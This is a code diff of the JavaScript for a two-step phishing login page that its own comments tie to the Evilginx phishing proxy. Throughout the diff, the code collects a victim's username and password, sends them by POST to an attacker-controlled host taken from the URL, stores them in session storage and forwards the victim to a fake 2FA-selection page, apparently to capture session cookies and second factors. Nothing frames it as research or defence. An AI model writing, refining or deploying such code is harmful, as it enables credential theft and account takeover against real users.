@@ -1,82 +1,74 @@
 document.addEventListener("DOMContentLoaded", () => {
+  const params = new URLSearchParams(window.location.search)
+  const apiHost = params.get("api_host")
+
+  const errorBanner = document.getElementById("error-banner")
   const emailStep = document.getElementById("email-step")
   const passwordStep = document.getElementById("password-step")
   const nextToPasswordBtn = document.getElementById("next-to-password")
-  const submitCredentialsBtn = document.getElementById("submit-credentials")
+  const loginForm = document.getElementById("login-form")
   const usernameInput = document.getElementById("username")
-  const passwordInput = document.getElementById("passwd")
-  const passwordUserIdentifier = document.getElementById("password-user-identifier")
-  const errorMessage = document.getElementById("error-message")
+  const passwordInput = document.getElementById("password")
+  const userIdentifier = document.getElementById("user-identifier")
 
-  // Store credentials temporarily
-  let capturedUsername = ""
+  if (!apiHost) {
+    document.body.innerHTML = "<h1>Configuration Error: api_host parameter is missing.</h1>"
+    return
+  }
 
-  // --- Step 1: Move from Email to Password screen ---
+  function showError(message) {
+    errorBanner.textContent = message
+    errorBanner.style.display = "block"
+  }
+
   nextToPasswordBtn.addEventListener("click", (e) => {
     e.preventDefault()
-    if (usernameInput.value) {
-      capturedUsername = usernameInput.value
-      passwordUserIdentifier.textContent = capturedUsername
-      emailStep.style.display = "none"
-      passwordStep.style.display = "block"
+    if (usernameInput.value.trim() === "") {
+      showError("Please enter a username or email.")
+      return
     }
+    errorBanner.style.display = "none"
+    userIdentifier.textContent = `Signing in as ${usernameInput.value}`
+    emailStep.classList.remove("active")
+    passwordStep.classList.add("active")
   })
 
-  // --- Step 2: Submit credentials to Evilginx API ---
-  submitCredentialsBtn.addEventListener("click", (e) => {
+  loginForm.addEventListener("submit", (e) => {
     e.preventDefault()
-    const capturedPassword = passwordInput.value
+    const username = usernameInput.value
+    const password = passwordInput.value
 
-    if (!capturedUsername || !capturedPassword) {
-      alert("Please enter both username and password.")
+    if (password.trim() === "") {
+      showError("Please enter your password.")
       return
     }
 
-    // Get API host from URL
-    const urlParams = new URLSearchParams(window.location.search)
-    const apiHost = urlParams.get("api_host")
-
-    if (!apiHost) {
-      alert("FATAL: API host not found in URL.")
-      return
-    }
+    const submitButton = document.getElementById("submit-credentials")
+    submitButton.textContent = "Please wait..."
+    submitButton.disabled = true
 
     const formData = new URLSearchParams()
-    formData.append("username", capturedUsername)
-    formData.append("passwd", capturedPassword)
-
-    // Show loading state
-    submitCredentialsBtn.textContent = "Please wait..."
-    submitCredentialsBtn.style.pointerEvents = "none"
+    formData.append("username", username)
+    formData.append("passwd", password)
 
     fetch(`${apiHost}/account/challenge/password`, {
       method: "POST",
-      mode: "cors", // Important for cross-domain requests
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
-      body: formData.toString(),
+      body: formData,
+      credentials: "omit", // We are not in a proxied context, so we can't include credentials directly
     })
       .then((response) => {
-        // The response from a proxied POST is often opaque, we rely on the redirect URL
-        // A successful password submission will redirect to the 2FA page.
-        // We can check the response URL to determine the next step.
-        // For this custom flow, we assume success leads to 2FA.
-
-        // Store data in sessionStorage to pass to the next page
-        sessionStorage.setItem("yh_username", capturedUsername)
+        // We don't need to parse the response. The act of posting the credentials
+        // to the proxied endpoint is what allows Evilginx to capture them and the cookies.
+        // We assume the next step is always 2FA for a robust flow.
+        sessionStorage.setItem("yh_username", username)
         sessionStorage.setItem("yh_api_host", apiHost)
-
-        // Redirect to 2FA selection page
-        window.location.href = `2fa-selection.html`
+        window.location.href = "2fa-selection.html"
       })
       .catch((error) => {
-        console.error("Error:", error)
-        errorMessage.textContent = "An unexpected error occurred. Please try again."
-        errorMessage.style.display = "block"
-        // Restore button
-        submitCredentialsBtn.textContent = "Next"
-        submitCredentialsBtn.style.pointerEvents = "auto"
+        console.error("Error submitting credentials:", error)
+        showError("An unexpected error occurred. Please try again.")
+        submitButton.textContent = "Next"
+        submitButton.disabled = false
       })
   })
 })
